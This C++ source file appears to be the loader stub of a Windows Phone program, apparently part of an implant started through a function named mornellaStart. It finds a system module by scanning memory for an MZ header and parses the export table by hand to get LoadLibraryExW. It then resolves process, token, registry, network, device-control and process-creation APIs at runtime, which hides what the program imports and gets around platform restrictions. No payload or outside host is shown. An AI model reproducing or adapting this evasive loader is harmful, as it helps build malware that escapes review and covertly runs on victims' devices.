extern "C" int mornellaStart(void);

//#include "pch.h"
#include <windows.h>
#include "FunctionFunc.h"


	FunctionFuncSleep _Sleep;
	FunctionFuncGetModuleHandleW _GetModuleHandleW;
	FunctionFuncCreateThread _CreateThread;
	FunctionFuncWaitForSingleObject _WaitForSingleObject;
	FunctionFuncCreateEvent _CreateEventW;
	FunctionFuncCreateToolhelp32Snapshot   _CreateToolhelp32Snapshot;
	FunctionFuncProcess32FirstW   _Process32FirstW;
	FunctionFuncOpenProcessToken   _OpenProcessToken;
	FunctionFuncProcess32NextW  _Process32NextW;
	FunctionFuncOpenProcess   _OpenProcess;
	FunctionFuncGlobalMemoryStatus _GlobalMemoryStatus;
	FunctionFuncGetVersionExW   _GetVersionExW;
	FunctionFuncCloseToolhelp32Snapshot _CloseToolhelp32Snapshot;
	FunctionFuncCreateFileW _CreateFileW;
	FunctionFuncRegOpenKeyExW   _RegOpenKeyExW;
	FunctionFuncRegCloseKey   _RegCloseKey;
    FunctionFuncRegSetValueEx _RegSetValueEx;
	FunctionFuncRegFlushKey _RegFlushKey;
	FunctionFuncGetFileSize _GetFileSize;
	FunctionFuncFindFirstFile  _FindFirstFile;
	FunctionFuncGetIpAddrTable _GetIpAddrTable;
	FunctionFuncGetAdapterIndex _GetAdapterIndex;
	FunctionFuncRegQueryValueExW _RegQueryValueExW;
	FunctionFuncCreateMutexW _CreateMutexW;
	FunctionFuncReleaseMutex _ReleaseMutex;
	FunctionFuncRtlZeroMemory _RtlZeroMemory;
	FunctionFuncRtlFillMemory _RtlFillMemory;
	FunctionFuncRtlCopyMemory _RtlCopyMemory;
	FunctionFuncRtlMoveMemory _RtlMoveMemory;
	FunctionFuncDeviceIoControl _DeviceIoControl;
	FunctionFuncGetSystemInfo _GetSystemInfo;
	FunctionFuncSetFilePointer _SetFilePointer;
	FunctionFuncCreateProcessW _CreateProcessW;



PIMAGE_NT_HEADERS WINAPI ImageNtHeader(PVOID Base)
{
	return (PIMAGE_NT_HEADERS)
		((LPBYTE) Base + ((PIMAGE_DOS_HEADER) Base)->e_lfanew);
}

PIMAGE_SECTION_HEADER WINAPI RtlImageRvaToSection( const IMAGE_NT_HEADERS *nt,
                                                   HMODULE module, DWORD_PTR rva )
{
    int i;
    const IMAGE_SECTION_HEADER *sec;

    sec = (const IMAGE_SECTION_HEADER*)((const char*)&nt->OptionalHeader +
                                        nt->FileHeader.SizeOfOptionalHeader);
    for (i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++)
    {
        if ((sec->VirtualAddress <= rva) && (sec->VirtualAddress + sec->SizeOfRawData > rva))
            return (PIMAGE_SECTION_HEADER)sec;
    }
    return NULL;
}

PVOID WINAPI RtlImageRvaToVa( const IMAGE_NT_HEADERS *nt, HMODULE module,
                              DWORD_PTR rva, IMAGE_SECTION_HEADER **section )
{
    IMAGE_SECTION_HEADER *sec;

    if (section && *section)  /* try this section first */
    {
        sec = *section;
        if ((sec->VirtualAddress <= rva) && (sec->VirtualAddress + sec->SizeOfRawData > rva))
            goto found;
    }
    if (!(sec = RtlImageRvaToSection( nt, module, rva ))) return NULL;
 found:
    if (section) *section = sec;
    return (char *)module + sec->PointerToRawData + (rva - sec->VirtualAddress);
}

PVOID WINAPI ImageDirectoryEntryToDataEx( PVOID base, BOOLEAN image, USHORT dir, PULONG size, PIMAGE_SECTION_HEADER *section )
{
    const IMAGE_NT_HEADERS *nt;
    DWORD_PTR addr;

    *size = 0;
    if (section) *section = NULL;

    if (!(nt = ImageNtHeader( base ))) return NULL;
    if (dir >= nt->OptionalHeader.NumberOfRvaAndSizes) return NULL;
    if (!(addr = nt->OptionalHeader.DataDirectory[dir].VirtualAddress)) return NULL;

    *size = nt->OptionalHeader.DataDirectory[dir].Size;
    if (image || addr < nt->OptionalHeader.SizeOfHeaders) return (char *)base + addr;

    return RtlImageRvaToVa( nt, (HMODULE)base, addr, section );
}



// == Windows API GetProcAddress
void *PeGetProcAddressA(void *Base, LPCSTR Name)
{
	DWORD Tmp;

	IMAGE_NT_HEADERS *NT=ImageNtHeader(Base);
	IMAGE_EXPORT_DIRECTORY *Exp=(IMAGE_EXPORT_DIRECTORY*)ImageDirectoryEntryToDataEx(Base,TRUE,IMAGE_DIRECTORY_ENTRY_EXPORT,&Tmp,0);
	if(Exp==0 || Exp->NumberOfFunctions==0)
	{
		SetLastError(ERROR_NOT_FOUND);
		return 0;
	}

	DWORD *Names=(DWORD*)(Exp->AddressOfNames+(DWORD_PTR)Base);
	WORD *Ordinals=(WORD*)(Exp->AddressOfNameOrdinals+(DWORD_PTR)Base);
	DWORD *Functions=(DWORD*)(Exp->AddressOfFunctions+(DWORD_PTR)Base);

	FARPROC Ret=0;

	if((DWORD_PTR)Name<65536)
	{
		if((DWORD_PTR)Name-Exp->Base<Exp->NumberOfFunctions)
			Ret=(FARPROC)(Functions[(DWORD_PTR)Name-Exp->Base]+(DWORD_PTR)Base);
	} else
	{
		for(DWORD i=0; i<Exp->NumberOfNames && Ret==0; i++)
		{
			char *Func=(char*)(Names[i]+(DWORD_PTR)Base);
			if(Func && strcmp(Func,Name)==0)
				Ret=(FARPROC)(Functions[Ordinals[i]]+(DWORD_PTR)Base);
		}
	}

	if(Ret)
	{
		DWORD ExpStart=NT->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress+(DWORD)Base;
		DWORD ExpSize=NT->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
		if((DWORD)Ret>=ExpStart && (DWORD)Ret<=ExpStart+ExpSize)
		{
			// Forwarder
			return 0;
		}
		return Ret;
	}

	return 0;	
}


	
	

int setLoadLibraryExW(void)
{

	char *Tmp=(char*)GetTickCount64;
	Tmp=(char*)((~0xFFF)&(DWORD_PTR)Tmp);

	while(Tmp)
	{
		
		if(Tmp[0]=='M' && Tmp[1]=='Z')
				break;
		
		Tmp-=0x1000;
	}

	if(Tmp==0)
		return -1;


	t_LLW* LoadLibraryExW=0;

	LoadLibraryExW=(t_LLW*)PeGetProcAddressA(Tmp,"LoadLibraryExW");

	_Sleep = (FunctionFuncSleep)GetProcAddress(LoadLibraryExW(L"KERNELBASE",NULL,0),"Sleep");
	_GetModuleHandleW=  (FunctionFuncGetModuleHandleW)GetProcAddress(LoadLibraryExW(L"KERNELBASE",NULL,0),"GetModuleHandleW");
	_CreateThread=  (FunctionFuncCreateThread)GetProcAddress(LoadLibraryExW(L"KERNELBASE",NULL,0),"CreateThread");
	_WaitForSingleObject=  (FunctionFuncWaitForSingleObject)GetProcAddress(LoadLibraryExW(L"KERNELBASE",NULL,0),"WaitForSingleObject");
	_CreateEventW = (FunctionFuncCreateEvent)GetProcAddress(LoadLibraryExW(L"KERNELBASE",NULL,0),"CreateEventW");
	 
	HINSTANCE LibHandle;
	LibHandle = LoadLibraryExW(L"kernel32legacy",NULL,0);
	_CreateToolhelp32Snapshot =  (FunctionFuncCreateToolhelp32Snapshot)GetProcAddress(LibHandle,"CreateToolhelp32Snapshot");

	LibHandle = LoadLibraryExW(L"kernel32legacy",NULL,0);
	_Process32FirstW =  (FunctionFuncProcess32FirstW)GetProcAddress(LibHandle,"Process32FirstW");
	
	LibHandle = LoadLibraryExW(L"KERNELBASE",NULL,0);
	_OpenProcessToken=  (FunctionFuncOpenProcessToken)GetProcAddress(LibHandle,"OpenProcessToken");

	LibHandle = LoadLibraryExW(L"kernel32legacy",NULL,0);
	_Process32NextW =  (FunctionFuncProcess32NextW)GetProcAddress(LibHandle,"Process32NextW");

	LibHandle = LoadLibraryExW(L"KERNELBASE",NULL,0);
	_OpenProcess=  (FunctionFuncOpenProcess)GetProcAddress(LibHandle,"OpenProcess");


	LibHandle = LoadLibraryExW(L"kernel32legacy",NULL,0);
	_CloseToolhelp32Snapshot =  (FunctionFuncCloseToolhelp32Snapshot)GetProcAddress(LibHandle,"CloseToolhelp32Snapshot");

	
	LibHandle = LoadLibraryExW(L"kernel32legacy",NULL,0);
	_GlobalMemoryStatus =  (FunctionFuncGlobalMemoryStatus)GetProcAddress(LibHandle,"GlobalMemoryStatus");

	_GetVersionExW=  (FunctionFuncGetVersionExW)GetProcAddress(LoadLibraryExW(L"KERNELBASE",NULL,0),"GetVersionExW");


	LibHandle = LoadLibraryExW(L"KERNELBASE",NULL,0);
	_CreateFileW=  (FunctionFuncCreateFileW)GetProcAddress(LibHandle,"CreateFileW");


	LibHandle = LoadLibraryExW(L"KERNELBASE",NULL,0);
	_RegOpenKeyExW =  (FunctionFuncRegOpenKeyExW)GetProcAddress(LibHandle,"RegOpenKeyExW");

	
	LibHandle = LoadLibraryExW(L"KERNELBASE",NULL,0);
    _RegCloseKey =  (FunctionFuncRegCloseKey)GetProcAddress(LibHandle,"RegCloseKey");


	LibHandle = LoadLibraryExW(L"KERNELBASE",NULL,0);
    _RegSetValueEx =  (FunctionFuncRegSetValueEx)GetProcAddress(LibHandle,"RegSetValueEx");


	LibHandle = LoadLibraryExW(L"KERNELBASE",NULL,0);
    _RegFlushKey =  (FunctionFuncRegFlushKey)GetProcAddress(LibHandle,"RegFlushKey");



	LibHandle = LoadLibraryExW(L"KERNELBASE",NULL,0);
    _GetFileSize =  (FunctionFuncGetFileSize)GetProcAddress(LibHandle,"GetFileSize");


	LibHandle = LoadLibraryExW(L"KERNELBASE",NULL,0);
	_FindFirstFile =  (FunctionFuncFindFirstFile)GetProcAddress(LibHandle,"FindFirstFileW");

	
	LibHandle = LoadLibraryExW(L"IPHLPAPI",NULL,0);
	_GetIpAddrTable =  (FunctionFuncGetIpAddrTable)GetProcAddress(LibHandle,"GetIpAddrTable");


	LibHandle = LoadLibraryExW(L"IPHLPAPI",NULL,0);
	_GetAdapterIndex =  (FunctionFuncGetAdapterIndex)GetProcAddress(LibHandle,"GetAdapterIndex");

	LibHandle = LoadLibraryExW(L"KERNELBASE",NULL,0);
	_RegQueryValueExW =  (FunctionFuncRegQueryValueExW)GetProcAddress(LibHandle,"RegQueryValueExW");
	

	LibHandle = LoadLibraryExW(L"KERNELBASE",NULL,0);
	_CreateMutexW =  (FunctionFuncCreateMutexW)GetProcAddress(LibHandle,"CreateMutexW");


	LibHandle = LoadLibraryExW(L"KERNELBASE",NULL,0);
	_ReleaseMutex =  (FunctionFuncReleaseMutex)GetProcAddress(LibHandle,"ReleaseMutex");

	LibHandle = LoadLibraryExW(L"KERNELBASE",NULL,0);
	_GetSystemInfo =  (FunctionFuncGetSystemInfo)GetProcAddress(LibHandle,"GetSystemInfo");


	LibHandle = LoadLibraryExW(L"NTDLL",NULL,0);
	_RtlZeroMemory =  (FunctionFuncRtlZeroMemory)GetProcAddress(LibHandle,"RtlZeroMemory");

	LibHandle = LoadLibraryExW(L"NTDLL",NULL,0);
	_RtlFillMemory=  (FunctionFuncRtlFillMemory)GetProcAddress(LibHandle,"RtlFillMemory");


	LibHandle = LoadLibraryExW(L"NTDLL",NULL,0);
	_RtlCopyMemory=  (FunctionFuncRtlCopyMemory)GetProcAddress(LibHandle,"RtlCopyMemory");

	LibHandle = LoadLibraryExW(L"NTDLL",NULL,0);
	_RtlMoveMemory=  (FunctionFuncRtlMoveMemory)GetProcAddress(LibHandle,"RtlMoveMemory");


	
	LibHandle = LoadLibraryExW(L"KERNELBASE",NULL,0);
	_DeviceIoControl =  (FunctionFuncDeviceIoControl)GetProcAddress(LibHandle,"DeviceIoControl");
		

	LibHandle = LoadLibraryExW(L"kernel32legacy",NULL,0);
	_GlobalMemoryStatus=  (FunctionFuncGlobalMemoryStatus)GetProcAddress(LibHandle,"GlobalMemoryStatus");


	LibHandle = LoadLibraryExW(L"KERNELBASE",NULL,0);
	_SetFilePointer=  (FunctionFuncSetFilePointer)GetProcAddress(LibHandle,"SetFilePointer");

	LibHandle = LoadLibraryExW(L"KERNELBASE",NULL,0);
    _CreateProcessW=  (FunctionFuncCreateProcessW)GetProcAddress(LibHandle,"CreateProcessW");
	

	return 0;
}


[Platform::MTAThread]
int main(Platform::Array<Platform::String^>^)
{

	setLoadLibraryExW();

	mornellaStart();

	return 0;
}